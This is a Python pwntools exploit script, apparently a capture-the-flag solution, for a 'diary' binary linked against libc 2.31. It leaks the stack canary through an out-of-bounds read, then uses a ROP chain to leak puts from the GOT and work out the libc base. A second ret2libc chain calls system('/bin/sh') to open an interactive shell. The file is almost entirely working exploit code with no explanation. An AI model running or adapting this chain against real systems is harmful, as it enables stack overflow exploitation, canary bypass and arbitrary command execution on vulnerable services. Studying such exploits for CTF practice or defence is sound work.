#!/usr/bin/env python3

from distutils import log
from pwn import *

exe = ELF("./diary_patched_patched_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")
rop = ROP(exe)
libc_rop = ROP(libc)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

def add_entry(r, index, content, timestamp):
    r.sendline(b"1")
    r.recvuntil(b": ")
    r.sendline(index)
    r.recvuntil(b"Dear diary, ")
    r.sendline(content)
    r.recvuntil(b": ")
    r.sendline(timestamp)

def read_entry(r, index):
    r.sendline(b"2")
    r.recvuntil(b": ")
    r.sendline(index)
    return r.recv()

def exit(r):
    r.sendline(b"3")

def main():
    r = conn()
    
    leak = read_entry(r, b"8")
    canary = int(leak[13:29],16)
    log.success(f"Canary: {hex(canary)}")
    
    
    POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
    RET = rop.find_gadget(['ret'])[0]
    MAIN = exe.symbols['main']

    payload = flat(
        POP_RDI,
        exe.got['puts'],
        exe.plt['puts'],
        MAIN
    )
    add_entry(r, b"8", b"A"*8 + payload, str(canary))
    exit(r)
    r.recvuntil(b"> ")
    leaked = r.recv(8).strip(b"\n").ljust(8, b"\x00")
    log.success(f'Leaked puts@GLIBC: {hex(u64(leaked))}')
    puts_leak = u64(leaked)

    # calculate libc base address
    libc.address = puts_leak - libc.sym['puts']
    log.success(f'LIBC base: {hex(libc.address)}')
    
    system = libc.sym['system'] # Get location of system
    binsh = next(libc.search(b'/bin/sh')) # Get string location
    payload = flat(
        RET,
        POP_RDI,
        p64(binsh),
        p64(system),
        p64(0x0)
    )

    add_entry(r, b"8", b"A"*8 + payload, str(canary))
    exit(r)
    #leak_libc = int(leak[13:29],16)
    #log.success(f"LIBC Leak: {hex(leak_libc)}")
    #one_gadget1 = libc.base + 0xe3afe
    #one_gadget2 = libc.base + 0xe3b01
    #one_gadget3 = libc.base + 0xe3b04

    r.interactive()


if __name__ == "__main__":
    main()
